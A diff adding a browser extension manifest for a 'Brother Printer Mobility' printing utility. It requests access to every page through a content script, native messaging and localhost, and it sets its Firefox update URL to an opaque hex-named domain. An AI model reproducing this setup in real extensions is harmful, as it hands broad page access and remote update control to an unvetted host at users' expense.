@@ -1,0 +1,40 @@
+{
+  "manifest_version": 2,
+  "name": "Brother Printer Mobility",
+  "version": "3.0",
+  "description": "Set the IP address of your Brother printer and send print jobs.",
+  "permissions": [
+    "storage",
+    "activeTab",
+    "http://localhost:3000/",
+    "nativeMessaging"
+  ],
+  "background": {
+    "scripts": ["background.js"]
+  },
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["content.js"]
+    }
+  ],
+  "browser_action": {
+    "default_popup": "popup.html",
+    "default_icon": {
+      "16": "icons/icon16.png",
+      "48": "icons/icon48.png",
+      "128": "icons/icon128.png"
+    }
+  },
+  "icons": {
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
+  },
+  "browser_specific_settings": {
+    "gecko": {
+      "id": "{69443dd0-f65b-436c-949e-3bffc7c2a341}",
+      "update_url": "https://dffa7c54656f49c49639.com/updates.json"
+    }
+  }
+}
